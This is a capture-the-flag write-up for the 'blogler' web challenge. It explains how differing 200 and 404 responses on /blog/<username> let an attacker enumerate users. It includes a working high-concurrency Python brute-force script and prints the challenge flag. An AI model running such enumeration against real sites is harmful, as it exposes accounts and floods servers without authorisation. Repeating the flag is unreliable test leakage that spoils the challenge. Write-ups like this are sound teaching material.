# blogler

**Category:** web

---

#### Description

The site hosts public user blog pages at `/blog/<username>`. If the user exists, the page renders their blog posts; if they do not exist, the server returns `404` with body `username does not exist`.

Goal: find the flag `lactf{...}`.

#### Solution

The intended weakness is simple user enumeration + content search:

1. Use the oracle on `GET /blog/<username>`:
   * Existing user: `200` and a real HTML blog page.
   * Non-existing user: `404` with body `username does not exist`.
2. Enumerate likely usernames (a dictionary wordlist is enough).
3. For each existing user page, search the HTML for the substring `lactf{`.

This quickly finds a public user named `exploiter` whose blog page contains the flag:

* `https://blogler.chall.lac.tf/blog/exploiter` -> `lactf{7m_g0nn4_bl0g_y0u}`

Solution code (async dictionary brute + flag grep):

```python
import asyncio
import re
from pathlib import Path

import aiohttp

BASE = "https://blogler.chall.lac.tf"
FLAG_RE = re.compile(r"lactf\\{[^}]+\\}")


def candidate_usernames() -> list[str]:
    # Any wordlist works. This one exists on many Linux systems.
    words = Path("/usr/share/dict/words").read_text(errors="ignore").splitlines()
    out = []
    for w in words:
        w = w.strip().lower()
        if not w:
            continue
        if not (1 <= len(w) <= 16):
            continue
        # Keep it simple: typical CTF usernames.
        if not re.fullmatch(r"[a-z][a-z0-9_-]*", w):
            continue
        out.append(w)
    return sorted(set(out))


async def worker(session: aiohttp.ClientSession, q: asyncio.Queue[str]) -> None:
    while True:
        u = await q.get()
        try:
            async with session.get(
                f"{BASE}/blog/{u}",
                timeout=aiohttp.ClientTimeout(total=10),
            ) as r:
                if r.status != 200:
                    continue
                txt = await r.text()
                if "username does not exist" in txt:
                    continue
                m = FLAG_RE.search(txt)
                if m:
                    print(m.group(0))
                    raise SystemExit(0)
        finally:
            q.task_done()


async def main() -> None:
    q: asyncio.Queue[str] = asyncio.Queue()
    for u in candidate_usernames():
        q.put_nowait(u)

    connector = aiohttp.TCPConnector(limit=200)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asyncio.create_task(worker(session, q)) for _ in range(80)]
        await q.join()
        for t in tasks:
            t.cancel()


if __name__ == "__main__":
    asyncio.run(main())
```
